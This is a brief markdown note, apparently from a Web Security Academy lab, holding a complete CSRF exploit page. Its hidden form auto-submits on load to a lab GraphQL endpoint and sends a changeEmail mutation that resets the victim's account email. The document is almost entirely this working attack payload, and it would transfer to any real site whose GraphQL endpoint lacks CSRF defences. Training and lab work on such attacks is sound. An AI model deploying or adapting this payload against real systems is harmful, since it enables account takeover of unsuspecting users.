
-------
# CSRF payload (temporal)

``` html
<html>
  <body>
    <form action="https://0a29000b03d208d882ff60a200c20051.web-security-academy.net/graphql/v1" method="POST">
      <input type="hidden" name="query" value='mutation changeEmail {
    changeEmail(input: {email: "gg@gg.com"}) {
        email
    }
}' />
      <input type="submit" value="Submit form" />
    </form>
    <script>
      document.forms[0].submit();
    </script>
  <body>
</html>
```